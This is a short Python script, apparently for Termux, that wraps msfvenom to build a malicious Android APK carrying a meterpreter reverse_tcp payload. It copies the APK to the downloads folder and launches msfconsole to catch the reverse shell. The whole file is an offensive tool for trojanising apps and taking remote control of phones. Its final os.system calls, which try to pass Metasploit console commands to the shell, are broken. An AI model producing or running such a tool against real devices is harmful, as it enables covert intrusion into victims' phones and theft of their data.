import os

Android_payload = input("Enter the payload - ",)
lhost = input("Enter your ip address - ",)
lport = input("Enter your port number - ",)
apk_name = input("Enter apk name - ",)
msfvenom_sentence = "msfvenom "+ Android_payload+ " lhost"+"="+lhost+ " lport"+ "="+ lport+" R> "+apk_name
os.system(msfvenom_sentence)

def payload():
    if Android_payload == "android/meterpreter/reverse_tcp":
        os.system("cp "+apk_name+" /data/data/com.termux/files/home/storage/downloads")
        os.system("msfconsole")
    else:
        print("Wrong syntax")
payload()

os.system("use exploit/multi/handler")
os.system("use android/meterpreter/reverse_tcp")
os.system("set lhost "+lhost)
os.system("set lport "+lport)
os.system("exploit")